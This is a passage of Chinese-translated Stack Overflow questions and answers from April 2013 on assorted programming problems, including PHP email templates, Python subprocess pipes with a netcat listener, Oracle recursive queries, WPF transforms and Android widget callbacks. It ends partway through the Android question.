调用[`redirect`](http://expressjs.com/api.html#res.redirect)的方法只是为了方便设置状态`302`（尽管您可以像在示例中那样覆盖它）和`Location`标题。应该禁止将其与 3xx 以外的状态一起使用，以避免像您这样的混淆。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T19:09:05.640

422 可能更适合 API 接口，但如果您希望最终用户到达正确的位置，您应该使用 302。

# docpad - docpad：元数据标头中的 yaml 后缀

> ID：16091101
> 
> 赞同：0
> 
> 时间：2013-04-18T19:02:55.587
> 
> 标签：docpad

我在某处看到`yaml`添加到元数据部分：

```
--- yaml
layout: 'post'
--- 
```

这是为什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:43:26.303

我想我自己找到了。

元数据部分可以由`yaml`或解析`cson`。因此，以 开头的元数据部分`--- yaml`或`---`将被解析为`yaml`，而以 开头的部分`--- cson`将被解析为`cson`。

# c# - 如何“即时”编写和编译

> ID：16091102
> 
> 赞同：-1
> 
> 时间：2013-04-18T19:02:56.877
> 
> 标签：c#

我希望能够将代码写入已经运行的程序中，当我点击 UI 上的发送代码按钮时，该程序将编译和实现代码。

例如：

如果我输入：

```
MessageBox.Show("Hello World"); 
```

然后点击发送，我会弹出一个说 Hello World 的窗口。

我已经搜索并搜索了解决方法，但我无法得到任何工作。

谁能推荐一个好方法来做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T19:10:58.273

您可以使用`CSharpCodeProvider`，但它是一项较旧的技术，很快就会过时。

Microsoft 正在玩弄的最新项目是 Roslyn，它目前在 CTP 中，它公开了 Microsoft 和 VStudio 等在构建 C# 和 VB.NET 应用程序时使用的编译器和分析系统。

这是有关如何使用其内置脚本引擎的链接。

[http://visualstudiomagazine.com/articles/2011/11/16/the-roslyn-scripting-api.aspx](http://visualstudiomagazine.com/articles/2011/11/16/the-roslyn-scripting-api.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-18T19:07:03.307

您正在寻找的是[CSharpCodeProvider](http://msdn.microsoft.com/en-us/library/microsoft.csharp.csharpcodeprovider.aspx)。

这允许您从源代码编译或评估 C# 代码并运行它。它可以在运行中和从另一个进程中完成。

# php - PHP - 如果输入检查使用电子邮件 $message 模板 1 否则使用模板 2

> ID：16091103
> 
> 赞同：0
> 
> 时间：2013-04-18T19:02:58.020
> 
> 标签：php, email, if-statement, payment

首先，我对 PHP 和电子邮件有些陌生，但如果用户有或没有选中输入框，我需要能够发送两个电子邮件模板。电子邮件功能有效并且一直有效，但我完全不知道如何使用 If Else 语句来交换模板。我的问题是，为什么我的控制台没有给我错误但它不再发送了。

**需要的路径...**

*   用户没有发票（检查输入框）> 切换到模板 1
*   用户有发票 > 切换到模板 2

    ```
    <p style="margin-top: 10px;">
    If you do not not your Invoice Number please check this box. 
    <input id="check" name="check" type="checkbox" />
    </p>

    ------------------------------------------------------------

    <?php

    $to      = $_POST['email'];
    $subject = 'Subject '       . $_POST['invoice_name'] . ' '
                                                . $_POST['invoice_year'] . ' - '
                                                . $_POST['invoice_number'];                 
    $header = "From: support@website.com" . "\r\n";
    $header .= "Reply-To: support@website.com" . "\r\n";
    $header .= "MIME-Version: 1.0" . "\r\n";
    $header .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";

    $message = if(isset($_POST['check']) {
        $message = '<html>
                        <body>
                            <h2>Email Template 2</h2>
                            <p>
                                Donec sed odio dui. Curabitur blandit tempus porttitor. Aenean eu leo quam. Pellentesque ornare sem lacinia quam venenatis vestibulum. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus. Donec sed odio dui.</p>
                            <p><b>Name:             </b>' . $_POST['first_name'] . ' ' . $_POST['last_name'] . '</p>
                            <p><b>Invoice #:        </b>' . $_POST['invoice_name'] . ' '
                                                          . $_POST['invoice_year'] . ' - ' 
                                                          . $_POST['invoice_number'] . '</p>
                            <p><b>Date:             </b>' . $today = date("F j, Y, g:i a") . '</p>
                            <p><b>Card Used:        </b> XXXX-XXXX-XXXX-' . $charge->card->last4 . '</p>
                            <p><b>Payment Amount:   </b>$' . $_POST['price'] . '</p>
                            <br/>
                            <p><b>Reminder:</b> Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus.</p>
                            <br/>
                            <p>http://www.website.com/payment</p>
                        </body>
                    </html>';

    } else {

        $message = '<html>
                        <body>
                            <h2>Email Template 2</h2>
                            <p>
                                Donec sed odio dui. Curabitur blandit tempus porttitor. Aenean eu leo quam. Pellentesque ornare sem lacinia quam venenatis vestibulum. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus. Donec sed odio dui.</p>
                            <p><b>Name:             </b>' . $_POST['first_name'] . ' ' . $_POST['last_name'] . '</p>
                            <p><b>Invoice #:        </b>' . $_POST['invoice_name'] . ' '
                                                          . $_POST['invoice_year'] . ' - ' 
                                                          . $_POST['invoice_number'] . '</p>
                            <p><b>Date:             </b>' . $today = date("F j, Y, g:i a") . '</p>
                            <p><b>Card Used:        </b> XXXX-XXXX-XXXX-' . $charge->card->last4 . '</p>
                            <p><b>Payment Amount:   </b>$' . $_POST['price'] . '</p>
                            <br/>
                            <p><b>Reminder:</b> Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus.</p>
                            <br/>
                            <p>http://www.website.com/payment</p>
                        </body>
                    </html>';
    };

    mail($to, $subject, $message, $header);

    ?> 
    ```

这是一种更简单的查看方式。

```
 <?php if(isset($_POST['check']) {

        $message = ' HAS NO INVOICE ';

    } else {        

        $message = '';

    };

    mail($to, $subject, $message, $header);
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T19:07:06.567

不知道你到底想做什么，但我会这样做 if/else 像这样：

```
$message = '';
if( isset($_POST['check']) )
{
    $message = '<html>
                    <body>
                        <h2>Email Template 1</h2>
                        <p>
                            Donec sed odio dui. Curabitur blandit tempus porttitor. Aenean eu leo quam. Pellentesque ornare sem lacinia quam venenatis vestibulum. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus. Donec sed odio dui.</p>
                        <p><b>Name:             </b>' . $_POST['first_name'] . ' ' . $_POST['last_name'] . '</p>
                        <p><b>Invoice #:        </b>' . $_POST['invoice_name'] . ' '
                                                      . $_POST['invoice_year'] . ' - ' 
                                                      . $_POST['invoice_number'] . '</p>
                        <p><b>Date:             </b>' . $today = date("F j, Y, g:i a") . '</p>
                        <p><b>Card Used:        </b> XXXX-XXXX-XXXX-' . $charge->card->last4 . '</p>
                        <p><b>Payment Amount:   </b>$' . $_POST['price'] . '</p>
                        <br/>
                        <p><b>Reminder:</b> Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus.</p>
                        <br/>
                        <p>http://www.website.com/payment</p>
                    </body>
                </html>';

} else {

    $message = '<html>
                    <body>
                        <h2>Email Template 2</h2>
                        <p>
                            Donec sed odio dui. Curabitur blandit tempus porttitor. Aenean eu leo quam. Pellentesque ornare sem lacinia quam venenatis vestibulum. Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus. Donec sed odio dui.</p>
                        <p><b>Name:             </b>' . $_POST['first_name'] . ' ' . $_POST['last_name'] . '</p>
                        <p><b>Invoice #:        </b>' . $_POST['invoice_name'] . ' '
                                                      . $_POST['invoice_year'] . ' - ' 
                                                      . $_POST['invoice_number'] . '</p>
                        <p><b>Date:             </b>' . $today = date("F j, Y, g:i a") . '</p>
                        <p><b>Card Used:        </b> XXXX-XXXX-XXXX-' . $charge->card->last4 . '</p>
                        <p><b>Payment Amount:   </b>$' . $_POST['price'] . '</p>
                        <br/>
                        <p><b>Reminder:</b> Fusce dapibus, tellus ac cursus commodo, tortor mauris condimentum nibh, ut fermentum massa justo sit amet risus.</p>
                        <br/>
                        <p>http://www.website.com/payment</p>
                    </body>
                </html>';
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:07:27.423

```
$message = if(isset($_POST['check']) { 
```

应该改为：

```
if(isset($_POST['check']) { 
```

因为您在 if 语句中设置消息

# actionscript-2 - 在 Actionscript 2 中加载外部 SWF

> ID：16091105
> 
> 赞同：2
> 
> 时间：2013-04-18T19:03:07.990
> 
> 标签：actionscript-2, flash

我在 Actionscript 2.0 / Flash Player 7 中的 Flash CS4 中创建动画

目前我有一个调用的处理程序（电影剪辑）`myHolder`，用于播放一个主 swf 文件中的其他 swf 文件，当通过按钮调用时

在将 swf 加载到主时间线的按钮中 - 例如

```
on (press)
{
    loadMovie("BulletTrainDRAFT.swf", myHolder);
} 
```

这可以很好地将其他 swf 文件带入主 swf 文件时间轴，但是当我带来一个包含视频的视频控件的 swf 文件时，它们在播放时不会在处理程序中响应，但是当该 swf 文件时它们会工作在其自己的外部 Flash 播放器窗口中播放**（视频在其设计 fla 内其自己的时间轴上的（电影剪辑）内）**

视频按钮 - ActionScript 2.0

```
btnStop.onPress = function(){

    _root.vid.stop();

}
btnPlay.onPress = function(){

    _root.vid.play();

}

btn_fastforward.onPress = function(){

    _root.vid.nextFrame();

}

btn_Rewind.onPress = function(){

    _root.vid.prevFrame();

} 
```

我也尝试了 ActionScript 3.0 代码

```
Pausebtn.addEventListener(MouseEvent.CLICK,pauseHandler);
Stopbtn.addEventListener(MouseEvent.CLICK, stopHandler);
Playbtn.addEventListener(MouseEvent.CLICK,playHandler);

function stopHandler(event:MouseEvent):void {
// Pause the stream and move the playhead back to
// the beginning of the stream.
video.gotoAndStop(1);
}
function playHandler(event:MouseEvent):void {
// Pause the stream and move the playhead back to
// the beginning of the stream.
video.play();
}
function pauseHandler(event:MouseEvent):void {
// Pause the stream and move the playhead back to
// the beginning of the stream.
video.stop();
} 
```

我认为的问题是，外部 swf 在现有时间线上加载的电影作为一个孩子并且没有卸载时间线导致动作脚本不起作用，但我无法解决这个问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-18T21:12:56.500

这是通过添加修复的

```
this._lockroot=true 
```

在 adobe 论坛上获得一些帮助后，转到视频主 fla 时间线^_^

再次感谢大家的帮助

# python - Python PIPE 打开标准输入

> ID：16091112
> 
> 赞同：4
> 
> 时间：2013-04-18T19:03:35.290
> 
> 标签：python, popen

我正在尝试[通过 stdout 和 PIPE 与实时 subprocess.Popen非常相似的东西](https://stackoverflow.com/questions/2082850/real-time-subprocess-popen-via-stdout-and-pipe)

但是，我也想将输入发送到正在运行的进程。

如果我在单独的线程中使用

```
process = subprocess.Popen(cmd,stdout=subprocess.PIPE, stderr=subprocess.STDOUT) 
```

我可以使用终端发送输入。

我将如何从其他来源发送输入，例如不在线程中的单独函数？

我无法使用`Popen.communicate`，因为运行过程永远不会完成，因为我正在尝试与程序进行实时交互。

提前致谢。

这是我的完整代码，我希望在单击发送按钮时将输入发送到子进程。

```
from Tkinter import *`
from ttk import *`
import subprocess
from threading import Thread

class Example(Frame):

    def __init__(self, parent):
       Frame.__init__(self, parent)   

        self.parent = parent
        self.initUI()

    def initUI(self):    

        self.parent.title("Test Client")
        self.style = Style()
        self.style.theme_use("default")
        self.pack(fill=BOTH, expand=1)

        #Label, doesnt change
        lbl = Label(self, text="Client:")
        lbl.grid(row=0, column=1, sticky=W )

        #when output from client is shown
        global display
        display = Text(self,width=50,height=20)
        display.grid(row=1, column=1, sticky=E+W+N+S)

        #where user input is taken
        global prompt
        prompt = Entry(self,width=50)
        prompt.grid(row=3, column=1, sticky=E+W+N+S)

        #Button that will send input to client
        send = Button(self,text="Send",command=self.send)
        send.grid(row=3, column=2, sticky=N)
        get = Button(self,text="Get",command=self.get)
        get.grid(row=2, column=2, sticky=S)

    def get(self):
        print foo

    def send(self):
        sent = prompt.get()

def MyThread():
     global sent
     sent = 2
     cmd = ['nc', '-l', '-p', '50000']

     process = subprocess.Popen(cmd,stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    while True:
        out = process.stdout.read(1)
        if out == '' and process.poll() != None:
            break
        if out != '':
            display.insert(INSERT, out)
            sys.stdout.write(out)
            sys.stdout.flush()

def main():
    root = Tk()
    root.geometry("500x410+300+300")
    app = Example(root)

    thread = Thread(target = MyThread, args=())
    thread.start()

    root.mainloop()

if __name__ == '__main__':
    main() 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-18T19:25:25.040

标准库中的[select](http://docs.python.org/2/library/select.html)模块是为这些情况而设计的：

```
process = subprocess.Popen(cmd,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

while True:
   reads,writes,excs = select.select([process.stdout, process.stderr], [process.stdin], [], 1)
   for r in reads:
       out = r.read(1)
       display.insert(INSERT, out)
       sys.stdout.write(out)
       sys.stdout.flush()
   for w in writes:
       w.write('a') 
```

您可以传递文件对象或文件描述符列表，`select()`这些文件将返回那些已准备好读取/写入数据或直到可选超时的文件。

select 模块适用于 Windows 和类 Unix 系统（Linux、Mac 等）。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-18T19:07:42.243

首先，你显然需要添加`stdin=subprocess.PIPE`到`Popen`构造函数中，然后你可以`process.stdin.write`像你一样`process.stdout.read`。

但是很明显，就像`read`如果还没有数据`write`可以阻塞一样，如果孩子没有阅读也可以阻塞。

甚至超出了显而易见的范围，实际上很难获得正确的细节，`Popen`以便在交互式程序中双向使用 PIPE 而不会阻塞任何地方。如果您真的想这样做，请查看[源代码`communicate`](http://hg.python.org/cpython/file/3.3/Lib/subprocess.py#l881)以了解它是如何工作的。（在 3.2 之前有已知的错误，所以如果你在 2.x 上，你可能需要做一些反向移植。）你必须自己实现代码，如果你希望它是跨平台的，你将不得不在`communicate`内部完成整个混乱（为管道生成读取器和写入器线程等），当然还要添加另一个线程以在每次尝试通信时不阻塞主线程，以及某种消息机制孩子准备好时的主线程，依此类推。

或者，您可以查看 PyPI 上的各种“异步子流程”项目。我今天所知道的最简单的是[`async_subprocess`](https://pypi.python.org/pypi/async_subprocess/0.2.1)，它基本上只是为您提供了一个`communicate`您可以在没有阻塞的情况下使用的。

或者，如果您可以使用`twisted`（或可能使用其他基于事件的网络框架），则有围绕子流程的包装器插入其事件循环。（如果您可以等待 Python 3.4，或者使用`tulip`3.3 上的进行中的工作，那么有人围绕它构建了类似的东西`tulip`，可能会使其进入 3.4。）`twisted`甚至知道如何插入`Tkinter`，因此您不必手动处理两个独立的事件循环并在它们之间进行通信。

如果您只关心现代 POSIX 系统（而不是 Windows），您可以通过将管道置于非阻塞模式并像处理套接字一样编写代码来使其更简单。

但最简单的解决方案可能是使用类似的东西[`pexpect`](http://www.noah.org/wiki/Pexpect)而不是尝试手动编写脚本。（正如 JF Sebastian 指出的那样，`pexpect`它仅适用于 Unix，但您可以`pexpect`为 Unix 和[`winpexpect`](https://bitbucket.org/geertj/winpexpect/overview)Windows 使用包装器。）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-18T20:30:40.860

在您的情况下，对代码更改最少的简单可移植解决方案可能是创建一个编写器线程，该线程从队列中获取项目并将它们写入进程的标准输入，然后在按下按钮时将值放入队列：

```
from subprocess import Popen, PIPE, STDOUT
from Queue import Queue

class Example(Frame):
    def __init__(self, parent, queue):
       # ...
       self.queue = queue
    # ...
    def send(self): # should be call on the button press
        self.queue.put(prompt.get())

def writer(input_queue, output): 
    for item in iter(input_queue.get, None): # get items until None found
        output.write(item)
    output.close()

def MyThread(queue):
    # ...
    #NOTE: you must set `stdin=PIPE` if you wan't to write to process.stdin
    process = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=STDOUT)
    Thread(target=writer, args=[queue, process.stdin]).start()
    # ...

def main():
    # ...
    queue = Queue()
    app = Example(root, queue)
    Thread(target=MyThread, args=[queue]).start()
    # ...
    root.mainloop()
    queue.put(None) # no more input for the subprocess 
```

# python - 使用 Python 对 LibSVM 中的多项式内核进行交叉验证

> ID：16091114
> 
> 赞同：0
> 
> 时间：2013-04-18T19:03:41.303
> 
> 标签：python, machine-learning, libsvm, svm

我正在将 LibSVM 与 Python 一起使用。在构建我的分类器之前，我想绘制不同值的交叉验证的平均误差，`d`并在平均准确度方面`C`找到最佳`(d, C)`组合。我编写了一个 Python 脚本来交叉验证特定`d, C`值，并且交叉验证的十次迭代中的每一次的输出都出现在屏幕上。我现在有两个问题：

1.  如何编写一个 Python 脚本，将变量`d`和`C`值作为函数中的参数`svm_parameter`。`svm_parameter('-d dval')`给出错误：

    ```
    ValueError : invalid literal for int() with base 10:dval 
    ```

2.  如何记录输出数据——除非我从 UNIX 屏幕手动复制它，否则我找不到保存每个分类准确度的方法。有没有办法访问和保存输出文件？

谢谢你。我是 Python 新手。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T21:01:32.157

我强烈建议您使用出色的[sklearn](http://scikit-learn.org/stable/)库来完成您的任务。它还具有 LibSVM 的包装器（请参阅[svm.SVC](http://scikit-learn.org/0.13/modules/generated/sklearn.svm.SVC.html)），但此外还为您提供了所有必要的[交叉验证工具、使用](http://scikit-learn.org/dev/modules/cross_validation.html)[网格搜索](http://scikit-learn.org/0.13/modules/grid_search.html)找到最佳 d 和 C、使用度量模块测量准确性的简单方法和一个巨大的许多其他有用的工具。

关于 valuerror，python 尝试将字符串 dval 转换为整数。您可能想要执行类似的操作`svm_parameter('-d %s' % dval)`，如果`dval`是保存 的值的变量`d`。

# r - R：网页抓取一个不显示任何数据的表格

> ID：16091116
> 
> 赞同：0
> 
> 时间：2013-04-18T19:03:44.390
> 
> 标签：r

我正在尝试抓取一个选项表：

[http://www.cmegroup.com/trading/metals/base/copper_quotes_settlements_options.html](http://www.cmegroup.com/trading/metals/base/copper_quotes_settlements_options.html)

我试过了：

```
library(XML)
options.cu<-readHTMLTable("http://www.cmegroup.com/trading/metals/base/copper_quotes_settlements_options.html",stringsAsFactors = FALSE)
options.cu 
```

但我只是得到：

$table_under_bluebar V1 V2 V3 1 交易日期类型到期

并且表中没有数据。我会很感激你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-19T08:13:04.807

该表是使用 javascript 动态创建的。您可以检查流量以查看是否可以找到供稿。这样做你会注意到以下网址：

```
http://www.cmegroup.com/CmeWS/mvc/xsltTransformer.do?xlstDoc=/XSLT/da/DailySettlement.xsl 
```

这需要一个 url 作为参数，表示产品线等。例如：

```
http://www.cmegroup.com/CmeWS/mvc/xsltTransformer.do?xlstDoc=/XSLT/da/DailySettlement.xsl&url=/da/DailySettlement/V1/DSReport/ProductCode/HX/FOI/OOF/EXCHANGE/XCEC/Underlying/HG/ProductId/797 
```

将获得可能具有产品 id 797 的铜选项表。可以通过指定参数添加其他参数：

```
http://www.cmegroup.com/CmeWS/mvc/xsltTransformer.do?xlstDoc=/XSLT/da/DailySettlement.xsl&url=/da/DailySettlement/V1/DSReport/ProductCode/HX/FOI/OOF/EXCHANGE/XCEC/Underlying/HG/ProductId/797?tradeDate=04/17/2013&monthYear=null&optionTypeName=Daily&optionType=AME 
```

您应该能够使用此提要获取相关数据：

```
xmlD <- "http://www.cmegroup.com/CmeWS/mvc/xsltTransformer.do?xlstDoc=/XSLT/da/DailySettlement.xsl&url=/da/DailySettlement/V1/DSReport/ProductCode/HX/FOI/OOF/EXCHANGE/XCEC/Underlying/HG/ProductId/797"

library(XML)
options.cu <- readHTMLTable(xmlD,stringsAsFactors = FALSE)
str(options.cu)
#List of 1
# $ DailySettlementTable:'data.frame':  337 obs. of  10 variables:
#  ..$ V1 : chr [1:337] "Daily Settlements for Copper American Options (FINAL)Trade Date: 04/18/2013" "Strike" "025" "050" ...
#  ..$ V2 : chr [1:337] NA "Type" "Call" "Call" ...
#  ..$ V3 : chr [1:337] NA "Open" "-" "-" ...
#  ..$ V4 : chr [1:337] NA "High" "-" "-" ...
#  ..$ V5 : chr [1:337] NA "Low" "-" "-" ...
#  ..$ V6 : chr [1:337] NA "Last" "-" "-" ...
#  ..$ V7 : chr [1:337] NA "Change" "+.0170" "+.0170" ...
#  ..$ V8 : chr [1:337] NA "Settle" "2.9545" "2.7045" ...
#  ..$ V9 : chr [1:337] NA "EstimatedVolume" "-" "-" ...
#  ..$ V10: chr [1:337] NA "Prior DayOpen Interest" "-" "-" ... 
```

# css - 将文本放在 div 中

> ID：16091127
> 
> 赞同：1
> 
> 时间：2013-04-18T19:04:11.337
> 
> 标签：css, html

在我的页面顶部，我有一个标题（div），距离页面顶部只有几 px 的距离。在 div 中，我得到了页面标题，并将其放置在左上角（这是正常的）。但它位于 div 的底部（仍在右侧）。这是我的html：

```
<body>
    <div id="header">
        <h1>x</h1>
    </div>
</body> 
```

还有我的 CSS：

```
#header {
    width: 700px;
    height: 200px;
    margin-left: auto;
    margin-right: auto;
    background-color: #ffffff;
    color: #cdffaf;
    font-size: 30px;
}

h1 {
margin-top: 5px;    
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:11:48.053

你可以`display: table-cell`使用`vertical-align: bottom;`

[**演示**](http://jsfiddle.net/Nxc2e/)

[颜色已更改（可见性）](http://jsfiddle.net/Nxc2e/1/)

# google-glass - Glass 用户如何注册以接收特定的服务时间线项目？

> ID：16091131
> 
> 赞同：4
> 
> 时间：2013-04-18T19:04:18.110
> 
> 标签：google-glass, google-mirror-api

我想弄清楚 Glass 用户如何注册以接收特定的时间线项目？我创建了要推送的时间线项目和 Glassware/Mirror 休息服务，Glass 用户将如何注册我创建的服务。是否有 Glass 应用订阅商店？

先感谢您。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-18T20:31:28.923

您的问题有两个部分：用户如何授权您的软件以及他们如何发现它。

**授权流程：Glass 用户使用**[OAuth 2.0](https://developers.google.com/glass/authorization)订阅 Glassware 。具体来说，通过授予您`https://www.googleapis.com/auth/glass.timeline`范围，他们为您的服务提供读取和写入其时间线的权限。

您可以在此序列图中的[API 使用故事](https://developers.google.com/glass/stories#cat_facts)页面中看到此流程：

![用户如何使用 OAuth 2.0 订阅服务](https://i.stack.imgur.com/sjpx7.png)

**发现**：尚未公布。

用户需要被引导到启动 OAuth 2.0 流程的 URL 以进行授权。用户如何找到该 URL 尚未得到解答。在开发者预览期间不要过分强调这一点。而是专注于 Mirror API 的功能。

# app-store-connect - iTunes Connect：针对特定语言的多种类型的应用程序描述？

> ID：16091135
> 
> 赞同：0
> 
> 时间：2013-04-18T19:04:29.670
> 
> 标签：app-store-connect

有没有一种快速的方法来获取用英语编写的应用程序描述并将其应用于所有英语语言？（例如：加拿大英语、英国英语。）

我不想为每种类型的英语创建单独的英语，因为它们都是相同的。我也想为法语做这个。

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-21T02:14:31.667

存在本地化差异是有原因的。它们*并不*完全相同。如果您使用美式英语完成了您的应用程序，请指定美式英语并将其作为您支持的唯一语言，因为 - 这是您支持的唯一语言！

如果您想进行正确的英国英语和加拿大英语本地化，那么我建议您从“WWDC 2012 Session 224 - Internationalization Tips and Tricks”的视频/幻灯片开始。

为什么？因为说英国和加拿大英语的人可能会在您试图将您的美国英语“本地化”冒充为母语时发现如此少的“幽默”，以至于他们可能会在您的应用评论中加入一些“丰富多彩”的语言。

这就是为什么。

还？铝。

# c# - 旋转元素的缩放

> ID：16091137
> 
> 赞同：2
> 
> 时间：2013-04-18T19:04:48.343
> 
> 标签：c#, wpf, math, rotation, scaling

假设我有一个要在视觉设计器中旋转和缩放的元素：用户应该能够拖动边缘并且图形应该适当地缩放。
旋转以度数输入。

以下事实是旋转元素的一个问题：
当左上角被拖动时，不仅宽度和高度会改变，而且左上角的位置也会改变。当右上方的点被拖动时，大小和 Y 位置也会发生变化

但是如果元素旋转（WPF RenderTransform，围绕它的中心旋转），那么行为必须相应地改变，我不知道如何。假设元素旋转了 90°，那么之前在左上角的点就是右上角。
这意味着我必须改变一些东西，但我完全被难住了，恐怕

我正在寻找一种在任何图形程序中实现的行为。
用户基本上拖动边界框的点，图形应投影在框内。

这个问题如何在 WPF 中解决？
绘制的元素派生自 UIElement，因此我可以访问所需的所有转换属性。该解决方案应该适用于输入的任何旋转。
如果您能帮助我，或者指出我正确的方向，我将不胜感激。

**编辑：**
我知道如何缩放和旋转元素。期望的结果是元素完全适合用户拖动的框。所以这个问题比 WPF 更与数学相关。

**编辑：**
感谢您在没有提供我可以改进的建议的情况下投票。
为了理解问题，请尝试以下操作：
创建一个新的 WPF 项目，添加任何 UIElement 并将其旋转，例如 90°。
现在在拖动之前记住边距，然后将右下角拖动到某处。如您所见，边距（= 位置）也发生了变化。我的问题是如何计算此补偿以在拖动时为用户提供所需的结果。因为如果我**不**改变位置来补偿比例，结果就会很奇怪并且不会像预期的那样表现。
补偿取决于元素的比例。明显地。
请参考下图：
您在这里看到的是在我拖动右下点之前的 Canvas.Top 和 Canvas.Left 属性，以及在我拖动右下点之后的下方。
[http://imageshack.us/photo/my-images/268/beforeaftert.png/?sa=0](http://imageshack.us/photo/my-images/268/beforeaftert.png/?sa=0)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-18T19:16:50.757

您应该使用 TransformGroup。

在 TransformGroup 中，您可以同时拥有 ScaleTransform、RotateTransform、TranslateTransform 和 SkewTransform（按此顺序，这很重要）。

通过这种方式，您可以将每个操作映射到不同的转换。

您实际上不需要考虑不同的点，只需将鼠标移动映射到不同的变换。例如：

如果单击其中一个角，则每次鼠标移动都会触发 ScaleTransform 的变化。如果单击旋转点，则可以触发 RotateTransform 中的更改。

如果您需要围绕中心的不同点进行缩放、倾斜或旋转，您将需要对当前执行的那个进行补偿转换：

*   ScaleTransform 将需要 translateTransformation 来补偿由缩放引起的横向/垂直差异。
*   当围绕不同的中心点旋转时，您只需更改旋转变换的 centerX / centerY

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-20T10:22:49.983

也许看看[http://www.codeproject.com/Articles/22952/WPF-Diagram-Designer-Part-1](http://www.codeproject.com/Articles/22952/WPF-Diagram-Designer-Part-1) 调整大小部分涵盖了这些问题。基本思想是识别您单击以调整大小的元素（左角，右角等）。然后有“数学”东西来设置画布的左和上。

# sql - 使用oracle的自我关系查询（孩子没有同一个父亲）

> ID：16091139
> 
> 赞同：0
> 
> 时间：2013-04-18T19:04:57.090
> 
> 标签：sql, oracle

我正在尝试处理涉及自关系表的查询。

我有这些行：

```
ID    Parent_ID

1     null
2     1
3     2
4     3
.
.
. 
```

“孩子”不是同一个父亲。每个“父亲”只有一个孩子。我有最后一个“孩子”的 ID。（例如，我的 ID = 4）..我想得到这个：

```
 1     null
  2     1
  3     2
  4     3 
```

鉴于父 ID 可能不是按顺序排列的，我如何检索这些行。

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-18T19:13:29.517

Oracle 支持递归查询：

```
SELECT t.id, t.parent_id
FROM t 
START WITH t.id = 4
CONNECT BY PRIOR t.parent_id = t.id 
```

sqlfiddle[在这里](http://sqlfiddle.com/#!4/1cfbf/6)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-18T19:19:10.773

另一种选择是使用递归 cte：

```
with cte (id, parent_id) as (
  select id, parent_id
  from yourtable
  where id = 4
  union all
  select y.id, y.parent_id
  from yourtable y
    join cte c on y.id = c.parent_id
  )
select * from cte order by id 
```

[SQL 小提琴演示](http://sqlfiddle.com/#!4/6c9b2/2)

# c++ - CreateRemoteThread 访问被拒绝

> ID：16091141
> 
> 赞同：6
> 
> 时间：2013-04-18T19:05:11.657
> 
> 标签：c++, access-denied

我正在尝试使用 CreateRemoteThread() 在“notepad.exe”进程上创建一个远程线程，但我收到错误代码 5“Access-Denied”。由于完整性级别为“高”，我尝试启用调试权限，但这并没有成功。我知道我的功能有效，因为我在一个简单的控制台应用程序上对其进行了测试并成功创建了它。因此，除了我缺少的调试权限之外，似乎还存在某种问题。

我很抱歉没有发布代码，我目前无权访问它。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-04-18T19:18:58.050

当您的应用程序（32 位）与 64 位操作系统上的目标应用程序（64 位）之间存在架构不匹配时，就会发生这种情况。解决方案是以 64 位模式编译您的程序（但当然它将无法再访问 32 位进程，这是非此即彼的）。

这可能是也可能不是您的情况（很难用这么少的信息来判断），但无论如何都值得一提，因此这个答案不仅仅是评论。

# android - Android onEnabled/onDisabled 从未调用过

> ID：16091144
> 
> 赞同：5
> 
> 时间：2013-04-18T19:05:23.227
> 
> 标签：android, android-widget, action, appwidgetprovider

我在触发 AppWidgetReciever 的 onEnabled 和 onDisabled 方法时遇到问题。我指定了操作，我还在 onRecieve 方法中记录了每个操作，但我得到的唯一两个操作是“APPWIDGET_UPDATE”和“APPWIDGET_DELETED”。我已经用谷歌搜索了这个解决方案，但不幸的是没有找到。这是我的代码：

清单部分：

```
<receiver android:name=".ScheduleWidgetProvider" >
            <intent-filter>
                <action android:name="android.appwidget.action.APPWIDGET_ENABLED" />
                <action android:name="android.appwidget.action.APPWIDGET_DISABLED" />
                <action android:name="android.appwidget.action.APPWIDGET_UPDATE" />
                <action android:name="android.appwidget.action.APPWIDGET_DELETED" /> 
            </intent-filter>
            <meta-data android:name="android.appwidget.provider"
                android:resource="@xml/provider_xml" />
        </receiver> 
```

提供者_xml：

```
<?xml version="1.0" encoding="utf-8"?>
<appwidget-provider xmlns:android="http://schemas.android.com/apk/res/android"
    android:minWidth="180dp"
    android:minHeight="40dp"
    android:updatePeriodMillis="60000"
    android:initialLayout="@layout/widget_layout"
    android:configure="org.zivkovic.schedule.ConfigurationActivity"
    >
</appwidget-provider> 
```

ScheduleWidgetProvider：

```
